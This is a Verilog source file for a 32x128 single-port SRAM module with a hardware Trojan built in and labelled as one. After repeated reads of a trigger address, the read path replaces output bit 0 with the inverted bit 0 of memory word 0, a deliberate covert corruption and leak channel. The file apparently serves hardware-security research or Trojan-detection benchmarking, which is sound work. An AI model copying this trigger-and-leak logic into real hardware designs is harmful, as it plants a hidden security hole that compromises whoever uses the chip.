`timescale 1ns/1ps

module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  // Trojan parameters
  localparam TRIGGER_ADDR = 7'b1010101; // Trojan activation address
  localparam LEAK_DELAY = 10; // Delay before leaking data

  input                   clk0;  
  input                   csb0;  
  input                   web0;  
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  // Trojan logic: Leak counter
  reg [3:0] leak_counter;
  always @(posedge clk0) begin
    if (!csb0_reg && web0_reg && addr0_reg == TRIGGER_ADDR) begin
      if (leak_counter < LEAK_DELAY) 
        leak_counter <= leak_counter + 1;
    end else begin
      leak_counter <= 0;
    end
  end

  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;
  end

  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg)
      mem[addr0_reg] <= din0_reg;
  end

  always @(negedge clk0) begin : MEM_READ0
    if (!csb0_reg && web0_reg) begin
      dout0 <= #(DELAY) mem[addr0_reg];
      // Trojan logic: Leak data after delay
      if (leak_counter == LEAK_DELAY)
        dout0[0] <= !mem[0][0]; // Leak a bit from a different memory location
    end
  end

endmodule